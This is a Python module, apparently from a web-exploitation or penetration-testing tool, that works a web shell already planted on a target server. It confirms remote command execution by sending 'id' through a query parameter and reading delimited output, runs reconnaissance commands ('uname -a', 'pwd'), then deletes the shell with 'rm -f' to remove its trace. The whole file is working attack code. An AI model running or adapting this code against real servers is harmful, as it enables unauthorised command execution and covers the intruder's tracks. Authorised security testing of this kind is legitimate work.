def _between(text, token):
    s, e = f"WSH_{token}_START", f"WSH_{token}_END"
    if s in text and e in text:
        return text.split(s, 1)[1].split(e, 1)[0].strip()
    return None


def verify(attempt, http):
    token = attempt["token"]
    try:
        resp = http.get(attempt["url"], params={"c": "id"})
    except Exception:
        return None
    out = _between(resp.text or "", token)
    if out is None:
        return None
    return {"url": attempt["url"], "variant": attempt["variant"],
            "token": token, "cmd_output": out}


def proof_recon(confirmed, http, cmds=("id", "uname -a", "pwd")):
    token = confirmed["token"]
    results = {}
    for c in cmds:
        try:
            resp = http.get(confirmed["url"], params={"c": c})
            results[c] = _between(resp.text or "", token) or ""
        except Exception:
            results[c] = ""
    return results


def cleanup(confirmed, http):
    basename = confirmed["url"].rsplit("/", 1)[-1]
    try:
        http.get(confirmed["url"], params={"c": f"rm -f {basename}"})
        check = http.get(confirmed["url"])
    except Exception:
        return False
    return f"WSH_{confirmed['token']}_START" not in (check.text or "")
